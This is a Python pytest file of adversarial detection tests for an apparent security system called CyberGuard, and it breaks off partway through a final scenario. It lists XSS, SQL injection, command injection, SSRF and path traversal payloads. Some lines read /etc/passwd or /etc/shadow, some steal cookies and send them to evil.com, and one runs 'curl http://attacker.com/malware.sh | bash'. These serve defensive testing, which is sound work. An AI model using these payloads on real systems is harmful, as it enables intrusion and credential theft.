# tests/adversarial_tests.py
"""
Adversarial tests for CyberGuard security system

This module tests the system against real attack patterns and adversarial inputs:
1. OWASP Top-10 attack payloads
2. Evasion techniques
3. Malicious payload obfuscation
4. Data exfiltration attempts
5. API abuse patterns
6. Bot and crawler evasion
7. WAF bypass techniques
8. Zero-day attack simulations

Each test validates that the system correctly detects and blocks attacks.
"""

import pytest
import sys
import os
import json
import re
import base64
import urllib.parse
from pathlib import Path
from typing import Dict, List, Any, Optional
import hashlib

# Add src to path for imports to allow importing from parent directory
sys.path.insert(0, str(Path(__file__).parent.parent))

# Import test utilities - note: these imports might fail if the module doesn't exist
# We'll handle this gracefully in the code
try:
    from tests.test_utils import (
        create_mock_threat_data,
        create_mock_website_data,
        validate_test_result,
        TEST_CONFIG
    )
except ImportError:
    # Define dummy functions if imports fail for testing purposes
    def create_mock_threat_data():
        return {}
    
    def create_mock_website_data():
        return {}
    
    def validate_test_result(result):
        return True
    
    TEST_CONFIG = {}

# Test markers for pytest to categorize tests
pytestmark = [
    pytest.mark.adversarial,  # Marks tests as adversarial tests
    pytest.mark.security,     # Marks tests as security tests
    pytest.mark.integration   # Marks tests as integration tests
]

class TestOWASPAttackPayloads:
    """Tests for OWASP Top-10 attack payload detection"""
    
    # OWASP Top-10 2021 categories for reference
    OWASP_CATEGORIES = [
        'A01:2021-Broken Access Control',
        'A02:2021-Cryptographic Failures',
        'A03:2021-Injection',
        'A04:2021-Insecure Design',
        'A05:2021-Security Misconfiguration',
        'A06:2021-Vulnerable and Outdated Components',
        'A07:2021-Identification and Authentication Failures',
        'A08:2021-Software and Data Integrity Failures',
        'A09:2021-Security Logging and Monitoring Failures',
        'A10:2021-Server-Side Request Forgery'
    ]
    
    @staticmethod
    def generate_xss_payloads() -> List[Dict[str, Any]]:
        """Generate various XSS payloads for testing"""
        return [
            {
                'name': 'basic_script_tag',
                'payload': '<script>alert("XSS")</script>',
                'description': 'Basic script tag XSS',
                'expected_detection': True
            },
            {
                'name': 'img_tag_with_onerror',
                'payload': '<img src=x onerror=alert("XSS")>',
                'description': 'XSS using img onerror',
                'expected_detection': True
            },
            {
                'name': 'svg_tag_with_script',
                'payload': '<svg onload=alert("XSS")>',
                'description': 'XSS using SVG onload',
                'expected_detection': True
            },
            {
                'name': 'javascript_protocol',
                'payload': 'javascript:alert("XSS")',
                'description': 'XSS using javascript: protocol',
                'expected_detection': True
            },
            {
                'name': 'base64_encoded',
                'payload': 'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=',
                'description': 'Base64 encoded XSS',
                'expected_detection': True
            },
            {
                'name': 'unicode_obfuscated',
                'payload': '＜script＞alert("XSS")＜/script＞',
                'description': 'Unicode obfuscated XSS',
                'expected_detection': True  # May be harder to detect
            },
            {
                'name': 'event_handler_obfuscated',
                'payload': '<a href="#" onmouseover="alert(\'XSS\')">Click</a>',
                'description': 'XSS using event handler',
                'expected_detection': True
            },
            {
                'name': 'iframe_src_javascript',
                'payload': '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                'description': 'XSS using iframe src',
                'expected_detection': True
            }
        ]
    
    @staticmethod
    def generate_sqli_payloads() -> List[Dict[str, Any]]:
        """Generate various SQL injection payloads"""
        return [
            {
                'name': 'basic_union_select',
                'payload': "' UNION SELECT username, password FROM users--",
                'description': 'Basic UNION SELECT injection',
                'expected_detection': True
            },
            {
                'name': 'or_always_true',
                'payload': "' OR '1'='1",
                'description': 'OR always true condition',
                'expected_detection': True
            },
            {
                'name': 'comment_termination',
                'payload': "admin'--",
                'description': 'Comment termination attack',
                'expected_detection': True
            },
            {
                'name': 'stacked_queries',
                'payload': "'; DROP TABLE users; --",
                'description': 'Stacked query attack',
                'expected_detection': True
            },
            {
                'name': 'time_based_blind',
                'payload': "' AND SLEEP(5)--",
                'description': 'Time-based blind SQLi',
                'expected_detection': True
            },
            {
                'name': 'boolean_based_blind',
                'payload': "' AND 1=1--",
                'description': 'Boolean-based blind SQLi',
                'expected_detection': True
            },
            {
                'name': 'error_based',
                'payload': "' AND GTID_SUBSET(@@version,0)--",
                'description': 'Error-based SQLi',
                'expected_detection': True
            },
            {
                'name': 'out_of_band',
                'payload': "'; EXEC xp_dirtree '\\\\attacker.com\\share'--",
                'description': 'Out-of-band SQLi',
                'expected_detection': True
            }
        ]
    
    @staticmethod
    def generate_command_injection_payloads() -> List[Dict[str, Any]]:
        """Generate command injection payloads"""
        return [
            {
                'name': 'basic_semicolon',
                'payload': '; ls -la',
                'description': 'Basic command injection with semicolon',
                'expected_detection': True
            },
            {
                'name': 'pipe_operator',
                'payload': '| cat /etc/passwd',
                'description': 'Command injection with pipe',
                'expected_detection': True
            },
            {
                'name': 'backtick_execution',
                'payload': '`whoami`',
                'description': 'Command injection with backticks',
                'expected_detection': True
            },
            {
                'name': 'dollar_substitution',
                'payload': '$(id)',
                'description': 'Command injection with $()',
                'expected_detection': True
            },
            {
                'name': 'conditional_execution',
                'payload': '&& cat /etc/shadow',
                'description': 'Command injection with &&',
                'expected_detection': True
            },
            {
                'name': 'windows_command',
                'payload': '& dir C:\\',
                'description': 'Windows command injection',
                'expected_detection': True
            },
            {
                'name': 'powershell_injection',
                'payload': '; powershell -c "Get-Process"',
                'description': 'PowerShell injection',
                'expected_detection': True
            }
        ]
    
    @staticmethod
    def generate_ssrf_payloads() -> List[Dict[str, Any]]:
        """Generate SSRF payloads"""
        return [
            {
                'name': 'local_host',
                'payload': 'http://localhost',
                'description': 'SSRF to localhost',
                'expected_detection': True
            },
            {
                'name': 'internal_ip',
                'payload': 'http://192.168.1.1',
                'description': 'SSRF to internal IP',
                'expected_detection': True
            },
            {
                'name': 'metadata_service',
                'payload': 'http://169.254.169.254/latest/meta-data/',
                'description': 'AWS metadata service SSRF',
                'expected_detection': True
            },
            {
                'name': 'file_protocol',
                'payload': 'file:///etc/passwd',
                'description': 'File protocol SSRF',
                'expected_detection': True
            },
            {
                'name': 'gopher_protocol',
                'payload': 'gopher://internal-service:port/_data',
                'description': 'Gopher protocol SSRF',
                'expected_detection': True
            },
            {
                'name': 'dns_rebinding',
                'payload': 'http://attacker-controlled.domain',
                'description': 'DNS rebinding SSRF',
                'expected_detection': True  # May require DNS analysis
            }
        ]
    
    @staticmethod
    def generate_path_traversal_payloads() -> List[Dict[str, Any]]:
        """Generate path traversal payloads"""
        return [
            {
                'name': 'basic_dot_dot',
                'payload': '../../etc/passwd',
                'description': 'Basic directory traversal',
                'expected_detection': True
            },
            {
                'name': 'encoded_dot_dot',
                'payload': '..%2F..%2Fetc%2Fpasswd',
                'description': 'URL encoded traversal',
                'expected_detection': True
            },
            {
                'name': 'double_encoded',
                'payload': '..%252F..%252Fetc%252Fpasswd',
                'description': 'Double URL encoded',
                'expected_detection': True
            },
            {
                'name': 'null_byte',
                'payload': '../../etc/passwd%00',
                'description': 'Traversal with null byte',
                'expected_detection': True
            },
            {
                'name': 'windows_traversal',
                'payload': '..\\..\\windows\\win.ini',
                'description': 'Windows path traversal',
                'expected_detection': True
            },
            {
                'name': 'absolute_path',
                'payload': '/etc/passwd',
                'description': 'Absolute path access',
                'expected_detection': True
            }
        ]
    
    @pytest.mark.parametrize("xss_test", generate_xss_payloads.__func__(object))
    def test_xss_detection(self, xss_test):
        """Test XSS payload detection"""
        # Skip if threat_detection_agent fixture is not available
        # In actual test environment, this would be provided by pytest fixtures
        try:
            # Try to get the fixture if running in pytest context
            agent = getattr(self, 'threat_detection_agent', None)
            if agent is None:
                pytest.skip("threat_detection_agent fixture not available")
        except AttributeError:
            pytest.skip("Test environment not properly configured")
        
        # Arrange test data
        payload = xss_test['payload']
        
        # Create request with XSS payload
        request_data = {
            'url': f'https://test.com/?q={urllib.parse.quote(payload)}',
            'headers': {},
            'body': f'input={payload}',
            'method': 'POST'
        }
        
        # Act - call analyze method on the agent
        result = agent.analyze(request_data)
        
        # Assert based on expected detection
        if xss_test['expected_detection']:
            # Should detect XSS with threat level > 0.3
            assert result['threat_level'] > 0.3, \
                f"{xss_test['name']}: Should detect XSS, threat_level={result['threat_level']}"
            
            # Should have XSS findings in the results
            xss_findings = [
                f for f in result['findings']
                if 'XSS' in str(f.get('type', '')).upper()
            ]
            assert len(xss_findings) > 0, \
                f"{xss_test['name']}: Should have XSS findings"
            
            print(f"Detected {xss_test['name']}: threat={result['threat_level']:.2f}")
        else:
            # Might not detect obfuscated XSS - just log for manual review
            print(f"Detection not guaranteed for {xss_test['name']}")
    
    @pytest.mark.parametrize("sqli_test", generate_sqli_payloads.__func__(object))
    def test_sqli_detection(self, sqli_test):
        """Test SQL injection payload detection"""
        # Skip if threat_detection_agent fixture is not available
        try:
            agent = getattr(self, 'threat_detection_agent', None)
            if agent is None:
                pytest.skip("threat_detection_agent fixture not available")
        except AttributeError:
            pytest.skip("Test environment not properly configured")
        
        # Arrange test data
        payload = sqli_test['payload']
        
        # Create request with SQL injection payload
        request_data = {
            'url': f'https://test.com/login?username={urllib.parse.quote(payload)}',
            'headers': {},
            'body': '',
            'method': 'GET'
        }
        
        # Act - analyze the request
        result = agent.analyze(request_data)
        
        # Assert based on expected detection
        if sqli_test['expected_detection']:
            # Should detect SQLi with threat level > 0.5
            assert result['threat_level'] > 0.5, \
                f"{sqli_test['name']}: Should detect SQLi, threat_level={result['threat_level']}"
            
            # Should have SQLi findings in the results
            sqli_findings = [
                f for f in result['findings']
                if 'SQL' in str(f.get('type', '')).upper()
            ]
            assert len(sqli_findings) > 0, \
                f"{sqli_test['name']}: Should have SQLi findings"
            
            print(f"Detected {sqli_test['name']}: threat={result['threat_level']:.2f}")
    
    @pytest.mark.parametrize("cmd_test", generate_command_injection_payloads.__func__(object))
    def test_command_injection_detection(self, cmd_test):
        """Test command injection detection"""
        # Skip if threat_detection_agent fixture is not available
        try:
            agent = getattr(self, 'threat_detection_agent', None)
            if agent is None:
                pytest.skip("threat_detection_agent fixture not available")
        except AttributeError:
            pytest.skip("Test environment not properly configured")
        
        # Arrange test data
        payload = cmd_test['payload']
        
        # Create request with command injection payload
        request_data = {
            'url': f'https://test.com/exec?cmd={urllib.parse.quote(payload)}',
            'headers': {},
            'body': '',
            'method': 'GET'
        }
        
        # Act - analyze the request
        result = agent.analyze(request_data)
        
        # Assert based on expected detection
        if cmd_test['expected_detection']:
            # Command injection often has high threat level > 0.6
            assert result['threat_level'] > 0.6, \
                f"{cmd_test['name']}: Should detect command injection, threat_level={result['threat_level']}"
            
            print(f"Detected {cmd_test['name']}: threat={result['threat_level']:.2f}")
    
    def test_mixed_attack_payloads(self):
        """Test detection of mixed/obfuscated attack payloads"""
        # Skip if threat_detection_agent fixture is not available
        try:
            agent = getattr(self, 'threat_detection_agent', None)
            if agent is None:
                pytest.skip("threat_detection_agent fixture not available")
        except AttributeError:
            pytest.skip("Test environment not properly configured")
        
        # Complex obfuscated payloads to test
        complex_attacks = [
            {
                'name': 'xss_with_entities',
                'payload': '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
                'type': 'XSS'
            },
            {
                'name': 'sqli_with_hex',
                'payload': '0x27204f52202731273d2731',  # ' OR '1'='1 in hex
                'type': 'SQL_INJECTION'
            },
            {
                'name': 'multiple_techniques',
                'payload': '<img src=x onerror="fetch(\'/api/data?q=\' + document.cookie)">',
                'type': 'XSS_DATA_EXFILTRATION'
            },
            {
                'name': 'prototype_pollution',
                'payload': '{"__proto__":{"isAdmin":true}}',
                'type': 'PROTOTYPE_POLLUTION'
            }
        ]
        
        # Test each complex attack
        for attack in complex_attacks:
            # Create request with the attack payload
            request_data = {
                'url': f'https://test.com/?data={urllib.parse.quote(attack["payload"])}',
                'headers': {},
                'body': '',
                'method': 'GET'
            }
            
            # Act - analyze the request
            result = agent.analyze(request_data)
            
            # Assert: Should detect something suspicious
            # (may not identify exact type for complex obfuscation)
            assert result['threat_level'] > 0.1, \
                f"{attack['name']}: Should detect suspicious payload, threat_level={result['threat_level']}"
            
            # Log the results for debugging
            print(f"{attack['name']}: threat={result['threat_level']:.2f}, "
                  f"findings={len(result['findings'])}")

class TestEvasionTechniques:
    """Tests for attack evasion techniques"""
    
    def test_case_obfuscation(self):
        """Test case obfuscation evasion"""
        # Skip if threat_detection_agent fixture is not available
        try:
            agent = getattr(self, 'threat_detection_agent', None)
            if agent is None:
                pytest.skip("threat_detection_agent fixture not available")
        except AttributeError:
            pytest.skip("Test environment not properly configured")
        
        # Case variations of XSS payload to test case insensitivity
        case_variations = [
            '<SCRIPT>alert("XSS")</SCRIPT>',  # Uppercase
            '<ScRiPt>alert("XSS")</sCrIpT>',  # Mixed case
            '<script>alert("XSS")</SCRIPT>',  # Mixed closing
        ]
        
        # Test each case variation
        for payload in case_variations:
            request_data = {
                'url': f'https://test.com/?q={urllib.parse.quote(payload)}',
                'headers': {},
                'body': '',
                'method': 'GET'
            }
            
            # Act - analyze the request
            result = agent.analyze(request_data)
            
            # Assert: Should still detect (case-insensitive matching)
            assert result['threat_level'] > 0.3, \
                f"Case obfuscation '{payload[:20]}...': Should detect, threat_level={result['threat_level']}"
            
            print(f"Case obfuscation detected: threat={result['threat_level']:.2f}")
    
    def test_whitespace_obfuscation(self):
        """Test whitespace obfuscation evasion"""
        # Skip if threat_detection_agent fixture is not available
        try:
            agent = getattr(self, 'threat_detection_agent', None)
            if agent is None:
                pytest.skip("threat_detection_agent fixture not available")
        except AttributeError:
            pytest.skip("Test environment not properly configured")
        
        # XSS with various whitespace patterns to test whitespace normalization
        whitespace_variations = [
            '<script>alert("XSS")</script>',  # Normal
            '<script> alert("XSS") </script>',  # Extra spaces
            '<script>\nalert("XSS")\n</script>',  # Newlines
            '<script>\talert("XSS")\t</script>',  # Tabs
            '<script>\ralert("XSS")\r</script>',  # Carriage returns
        ]
        
        # Test each whitespace variation
        for payload in whitespace_variations:
            request_data = {
                'url': f'https://test.com/?q={urllib.parse.quote(payload)}',
                'headers': {},
                'body': '',
                'method': 'GET'
            }
            
            # Act - analyze the request
            result = agent.analyze(request_data)
            
            # Assert: Should still detect (whitespace normalization)
            assert result['threat_level'] > 0.3, \
                f"Whitespace obfuscation: Should detect, threat_level={result['threat_level']}"
            
            print(f"Whitespace obfuscation detected: threat={result['threat_level']:.2f}")
    
    def test_encoding_evasion(self):
        """Test encoding-based evasion"""
        # Skip if threat_detection_agent fixture is not available
        try:
            agent = getattr(self, 'threat_detection_agent', None)
            if agent is None:
                pytest.skip("threat_detection_agent fixture not available")
        except AttributeError:
            pytest.skip("Test environment not properly configured")
        
        # Different encodings of the same XSS payload
        payload = '<script>alert("XSS")</script>'
        
        # Define different encoding types to test
        encodings = [
            ('url', urllib.parse.quote(payload)),
            ('double_url', urllib.parse.quote(urllib.parse.quote(payload))),
            ('html', '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;'),
            ('unicode', payload.encode('unicode_escape').decode()),
        ]
        
        # Test each encoding type
        for encoding_name, encoded_payload in encodings:
            request_data = {
                'url': f'https://test.com/?q={encoded_payload}',
                'headers': {},
                'body': '',
                'method': 'GET'
            }
            
            # Act - analyze the request
            result = agent.analyze(request_data)
            
            # Assert: Should detect encoded attacks
            # (decoding/normalization should happen)
            assert result['threat_level'] > 0.2, \
                f"{encoding_name} encoding: Should detect, threat_level={result['threat_level']}"
            
            print(f"{encoding_name} encoding detected: threat={result['threat_level']:.2f}")
    
    def test_fragmentation_evasion(self):
        """Test payload fragmentation evasion"""
        # Skip if threat_detection_agent fixture is not available
        try:
            agent = getattr(self, 'threat_detection_agent', None)
            if agent is None:
                pytest.skip("threat_detection_agent fixture not available")
        except AttributeError:
            pytest.skip("Test environment not properly configured")
        
        # Split XSS across multiple parameters to test reassembly detection
        fragmented_payloads = [
            ('param1', '<script>'),
            ('param2', 'alert('),
            ('param3', '"XSS"'),
            ('param4', ')</script>'),
        ]
        
        # Build URL with fragmented payload across multiple parameters
        query_params = '&'.join([f'{k}={urllib.parse.quote(v)}' for k, v in fragmented_payloads])
        url = f'https://test.com/?{query_params}'
        
        request_data = {
            'url': url,
            'headers': {},
            'body': '',
            'method': 'GET'
        }
        
        # Act - analyze the fragmented request
        result = agent.analyze(request_data)
        
        # Assert: Should detect fragmented attack
        # (may require reassembly analysis)
        assert result['threat_level'] > 0.3, \
            f"Fragmented payload: Should detect, threat_level={result['threat_level']}"
        
        print(f"Fragmented evasion detection: threat={result['threat_level']:.2f}")

class TestAPIAttackPatterns:
    """Tests for API-specific attack patterns"""
    
    def test_json_injection(self):
        """Test JSON injection attacks"""
        # Skip if threat_detection_agent fixture is not available
        try:
            agent = getattr(self, 'threat_detection_agent', None)
            if agent is None:
                pytest.skip("threat_detection_agent fixture not available")
        except AttributeError:
            pytest.skip("Test environment not properly configured")
        
        # Define various JSON-based attacks
        json_attacks = [
            {
                'name': 'json_sqli',
                'body': '{"username": "admin", "password": "\' OR \'1\'=\'1"}',
                'type': 'SQL_INJECTION'
            },
            {
                'name': 'json_xss',
                'body': '{"comment": "<script>alert(\"XSS\")</script>"}',
                'type': 'XSS'
            },
            {
                'name': 'json_prototype_pollution',
                'body': '{"__proto__": {"isAdmin": true}}',
                'type': 'PROTOTYPE_POLLUTION'
            },
            {
                'name': 'json_dos',
                'body': '{"data": "' + 'A' * 10000 + '"}',  # Large payload for DoS
                'type': 'DOS'
            }
        ]
        
        # Test each JSON attack
        for attack in json_attacks:
            request_data = {
                'url': 'https://api.test.com/login',
                'headers': {
                    'Content-Type': 'application/json'  # Set JSON content type
                },
                'body': attack['body'],
                'method': 'POST'
            }
            
            # Act - analyze the JSON request
            result = agent.analyze(request_data)
            
            # Assert: Should detect JSON-based attacks
            assert result['threat_level'] > 0.2, \
                f"JSON {attack['name']}: Should detect, threat_level={result['threat_level']}"
            
            print(f"JSON attack '{attack['name']}' detected: threat={result['threat_level']:.2f}")
    
    def test_graphql_injection(self):
        """Test GraphQL injection attacks"""
        # Skip if threat_detection_agent fixture is not available
        try:
            agent = getattr(self, 'threat_detection_agent', None)
            if agent is None:
                pytest.skip("threat_detection_agent fixture not available")
        except AttributeError:
            pytest.skip("Test environment not properly configured")
        
        # Define GraphQL-specific attacks
        graphql_attacks = [
            {
                'name': 'graphql_introspection',
                'body': '{"query": "{__schema{types{name fields{name}}}}"}',
                'type': 'INFORMATION_DISCLOSURE'
            },
            {
                'name': 'graphql_dos',
                'body': '{"query": "{\\n' + 'user(id: 1) { name }\\n' * 100 + '}"}',
                'type': 'DOS'
            },
            {
                'name': 'graphql_sqli',
                'body': '{"query": "query { user(id: \\"1\\" OR \\"1\\"=\\"1\\") { name } }"}',
                'type': 'SQL_INJECTION'
            }
        ]
        
        # Test each GraphQL attack
        for attack in graphql_attacks:
            request_data = {
                'url': 'https://api.test.com/graphql',
                'headers': {
                    'Content-Type': 'application/json'  # GraphQL typically uses JSON
                },
                'body': attack['body'],
                'method': 'POST'
            }
            
            # Act - analyze the GraphQL request
            result = agent.analyze(request_data)
            
            # Assert: Should detect GraphQL attacks
            # GraphQL attacks can be subtle
            assert result['threat_level'] > 0.1, \
                f"GraphQL {attack['name']}: Should detect, threat_level={result['threat_level']}"
            
            print(f"GraphQL attack '{attack['name']}' detected: threat={result['threat_level']:.2f}")
    
    def test_rate_limit_bypass(self):
        """Test rate limit bypass techniques"""
        # Skip if bot_detection_agent fixture is not available
        try:
            agent = getattr(self, 'bot_detection_agent', None)
            if agent is None:
                pytest.skip("bot_detection_agent fixture not available")
        except AttributeError:
            pytest.skip("Test environment not properly configured")
        
        # Define rate limit bypass techniques
        bypass_techniques = [
            {
                'name': 'ip_rotation',
                'headers': {'X-Forwarded-For': '1.2.3.4, 5.6.7.8, 9.10.11.12'},
                'description': 'IP rotation via headers'
            },
            {
                'name': 'user_agent_rotation',
                'headers': {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
                'description': 'Rotating user agents'
            },
            {
                'name': 'slowloris',
                'headers': {'Content-Length': '1000000'},
                'description': 'Slowloris attack headers'
            }
        ]
        
        # Test each bypass technique
        for technique in bypass_techniques:
            request_data = {
                'url': 'https://api.test.com/data',
                'headers': technique['headers'],
                'body': '',
                'method': 'GET'
            }
            
            # Act - use appropriate detection method
            if hasattr(agent, 'analyze'):
                result = agent.analyze(request_data)
            elif hasattr(agent, 'detect_bot'):
                result = agent.detect_bot(request_data)
            else:
                pytest.skip("Bot detection method not available")
            
            # Assert: Should detect bypass attempts
            # Bot detection might not flag all techniques
            if result and isinstance(result, dict) and 'threat_level' in result:
                assert result['threat_level'] > 0.1, \
                    f"{technique['name']}: Should detect suspicious activity"
                
                print(f"Rate limit bypass '{technique['name']}' detected: threat={result['threat_level']:.2f}")

class TestZeroDaySimulations:
    """Simulations of zero-day and novel attacks"""
    
    def test_polymorphic_malware(self):
        """Test detection of polymorphic/mutating payloads"""
        # Skip if threat_detection_agent fixture is not available
        try:
            agent = getattr(self, 'threat_detection_agent', None)
            if agent is None:
                pytest.skip("threat_detection_agent fixture not available")
        except AttributeError:
            pytest.skip("Test environment not properly configured")
        
        # Generate polymorphic XSS variants by mutating the base payload
        base_payload = 'alert("XSS")'
        polymorphic_variants = []
        
        # Different ways to call alert function
        alert_variants = [
            'alert',
            'window.alert',
            'self.alert',
            'top.alert',
            'parent.alert',
            'this.alert'
        ]
        
        # Different string delimiters
        string_delimiters = ['"', "'", '`']
        
        # Generate all combinations of variants
        for alert_func in alert_variants:
            for delimiter in string_delimiters:
                payload = f'<script>{alert_func}({delimiter}XSS{delimiter})</script>'
                polymorphic_variants.append(payload)
        
        detection_rates = []
        
        # Test a subset of variants for performance
        for payload in polymorphic_variants[:10]:
            request_data = {
                'url': f'https://test.com/?q={urllib.parse.quote(payload)}',
                'headers': {},
                'body': '',
                'method': 'GET'
            }
            
            # Act - analyze each variant
            result = agent.analyze(request_data)
            
            # Record detection (threat > 0.5 indicates detection)
            detected = result['threat_level'] > 0.5
            detection_rates.append(detected)
        
        # Assert: Should detect most polymorphic variants
        detection_rate = sum(detection_rates) / len(detection_rates) if detection_rates else 0
        assert detection_rate > 0.7, \
            f"Polymorphic malware detection rate too low: {detection_rate*100:.1f}%"
        
        print(f"Polymorphic detection rate: {detection_rate*100:.1f}%")
    
    def test_ai_generated_attacks(self):
        """Test detection of AI-generated attack payloads"""
        # Skip if threat_detection_agent fixture is not available
        try:
            agent = getattr(self, 'threat_detection_agent', None)
            if agent is None:
                pytest.skip("threat_detection_agent fixture not available")
        except AttributeError:
            pytest.skip("Test environment not properly configured")
        
        # Simulated AI-generated attacks (these would normally come from LLMs)
        ai_attacks = [
            {
                'name': 'ai_xss_context_aware',
                'payload': '''<img alt="profile picture" 
                             src="nonexistent.png" 
                             onerror="const token = document.cookie.match(/session=([^;]+)/)[1]; 
                                     fetch('https://evil.com/exfil?token=' + token);"
                             style="display:none">''',
                'type': 'XSS_DATA_EXFILTRATION'
            },
            {
                'name': 'ai_sqli_obfuscated',
                'payload': '''admin' AND (SELECT COUNT(*) FROM users WHERE username='admin' 
                             AND ASCII(SUBSTRING(password,1,1)) > 50)='1''',
                'type': 'SQL_INJECTION_BLIND'
            },
            {
                'name': 'ai_ssrf_advanced',
                'payload': '''http://localhost@internal-service.local/api/admin/
                             ../../../../etc/passwd%3Fquery%3D${jndi:ldap://attacker.com/exploit}''',
                'type': 'SSRF_JNDI'
            }
        ]
        
        # Test each AI-generated attack
        for attack in ai_attacks:
            request_data = {
                'url': f'https://test.com/?data={urllib.parse.quote(attack["payload"][:100])}',
                'headers': {},
                'body': attack['payload'],
                'method': 'POST'
            }
            
            # Act - analyze the AI-generated attack
            result = agent.analyze(request_data)
            
            # Assert: Should detect AI-generated attacks
            # These are complex but should still trigger detection
            assert result['threat_level'] > 0.3, \
                f"AI {attack['name']}: Should detect, threat_level={result['threat_level']}"
            
            print(f"AI attack '{attack['name']}' detected: threat={result['threat_level']:.2f}")
    
    def test_supply_chain_attack(self):
        """Test detection of supply chain attack patterns"""
        # Skip if threat_detection_agent fixture is not available
        try:
            agent = getattr(self, 'threat_detection_agent', None)
            if agent is None:
                pytest.skip("threat_detection_agent fixture not available")
        except AttributeError:
            pytest.skip("Test environment not properly configured")
        
        # Define supply chain attack patterns
        supply_chain_attacks = [
            {
                'name': 'malicious_npm_package',
                'payload': '''require('legitimate-package');
                             eval("malicious_code_here");
                             process.env.NODE_ENV === 'production' && 
                             require('child_process').exec('curl http://attacker.com/malware.sh | bash')''',
                'type': 'SUPPLY_CHAIN'
            },
            {
                'name': 'typosquatting',
                'payload': '''import requrest  # Typo for requests
                             from fake_package import steal_credentials''',
                'type': 'TYPOSQUATTING'
            },
            {
                'name': 'dependency_confusion',
                'payload': '''# package.json
                             {
                               "dependencies": {
                                 "internal-private-package": "^1.0.0"
                               }
                             }
                             # Attacker publishes internal-private-package to public registry''',
                'type': 'DEPENDENCY_CONFUSION'
            }
        ]
        
        # Test each supply chain attack
        for attack in supply_chain_attacks:
            # These might appear in file uploads or code reviews
            request_data = {
                'url': 'https://test.com/upload',
                'headers': {
                    'Content-Type': 'text/plain'  # Plain text upload
                },
                'body': attack['payload'],
                'method': 'POST'
            }
            
            # Act - analyze the supply chain attack
            result = agent.analyze(request_data)
            
            # Assert: Supply chain attacks are hard to detect in HTTP traffic
            # But should at least flag suspicious content
            assert result['threat_level'] > 0.1, \
                f"Supply chain {attack['name']}: Should flag suspicious content"
            
            print(f"Supply chain attack '{attack['name']}' flagged: threat={result['threat_level']:.2f}")

class TestDefenseEvasion:
    """Tests for defense evasion techniques"""
    
    def test_waf_bypass_techniques(self):
        """Test WAF bypass techniques"""
        # Skip if threat_detection_agent fixture is not available
        try:
            agent = getattr(self, 'threat_detection_agent', None)
            if agent is None:
                pytest.skip("threat_detection_agent fixture not available")
        except AttributeError:
            pytest.skip("Test environment not properly configured")
        
        # Define WAF bypass techniques
        waf_bypasses = [
            {
                'name': 'case_insensitive_bypass',
                'payload': '<ScRiPt>prompt`XSS`</ScRiPt>',
                'description': 'Case variation with template literal'
            },
            {
                'name': 'unicode_bypass',
                'payload': '<ſcript>alert("XSS")</ſcript>',  # Long s character
                'description': 'Unicode homoglyph'
            },
            {
                'name': 'null_byte_bypass',
                'payload': '<script>alert("XSS")</script>\x00',
                'description': 'Null byte injection'
            },
            {
                'name': 'multiple_encoding',
                'payload': '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
                'description': 'Double URL encoding'
            },
            {
                'name': 'sql_comment_bypass',
                'payload': "admin'/**/OR/**/'1'/**/='1",
                'description': 'SQL comments bypass'
            }
        ]
        
        detection_count = 0
        
        # Test each WAF bypass technique
        for bypass in waf_bypasses:
            request_data = {
                'url': f'https://test.com/?input={bypass["payload"]}',
                'headers': {},
                'body': '',
                'method': 'GET'
            }
            
            # Act - analyze the bypass attempt
            result = agent.analyze(request_data)
            
            # Check if detected (threat > 0.5 indicates detection)
            if result['threat_level'] > 0.5:
                detection_count += 1
                print(f"WAF bypass detected: {bypass['name']}")
            else:
                print(f"WAF bypass possibly successful: {bypass['name']}")
        
        # Assert: Should detect most WAF bypass attempts
        detection_rate = detection_count / len(waf_bypasses) if waf_bypasses else 0
        assert detection_rate > 0.6, \
            f"WAF bypass detection rate too low: {detection_rate*100:.1f}%"
        
        print(f"WAF bypass detection rate: {detection_rate*100:.1f}%")
    
    def test_beaconing_detection(self):
        """Test detection of C2 beaconing behavior"""
        # Skip if traffic_anomaly_agent fixture is not available
        try:
            agent = getattr(self, 'traffic_anomaly_agent', None)
            if agent is None:
                pytest.skip("traffic_anomaly_agent fixture not available")
        except AttributeError:
            pytest.skip("Test environment not properly configured")
        
        # Define beaconing behavior patterns
        beaconing_patterns = [
            {
                'name': 'regular_intervals',
                'pattern': [1, 61, 121, 181],  # Every 60 seconds
                'description': 'Regular interval beaconing'
            },
            {
                'name': 'jittered_intervals',
                'pattern': [1, 58, 122, 179],  # ~60 seconds with jitter
                'description': 'Jittered beaconing'
            },
            {
                'name': 'http_beacon',
                'headers': {
                    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                },
                'description': 'HTTP beacon with common headers'
            }
        ]
        
        # Test each beaconing pattern
        for pattern in beaconing_patterns:
            # Create traffic data simulating beaconing behavior
            traffic_data = {
                'request_times': pattern.get('pattern', []),
                'headers': pattern.get('headers', {}),
                'destination': 'attacker-controlled.com',
                'payload_size': 256  # Small payload typical for beacons
            }
            
            # Act - use appropriate analysis method
            if hasattr(agent, 'analyze_traffic'):
                result = agent.analyze_traffic(traffic_data)
            elif hasattr(agent, 'analyze'):
                result = agent.analyze({'traffic': traffic_data})
            else:
                pytest.skip("Traffic analysis method not available")
            
            # Assert: Should detect beaconing patterns
            if result and isinstance(result, dict):
                anomaly_score = result.get('anomaly_score', result.get('threat_level', 0))
                assert anomaly_score > 0.3, \
                    f"Beaconing '{pattern['name']}': Should detect, score={anomaly_score}"
                
                print(f"Beaconing '{pattern['name']}' detected: score={anomaly_score:.2f}")

@pytest.mark.integration
class TestAdversarialIntegration:
    """Integrated adversarial testing"""
    
    def test_complete_attack_scenario(self):
        """Test complete multi-stage attack scenario"""
        # Skip if agent_orchestrator fixture is not available
        try:
            orchestrator = getattr(self, 'agent_orchestrator', None)
            if orchestrator is None:
                pytest.skip("agent_orchestrator fixture not available")
        except AttributeError:
            pytest.skip("Test environment not properly configured")
        
        # Arrange: Simulate a complete multi-stage attack
        attack_scenario = {
            'url': 'https://victim.com/login',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
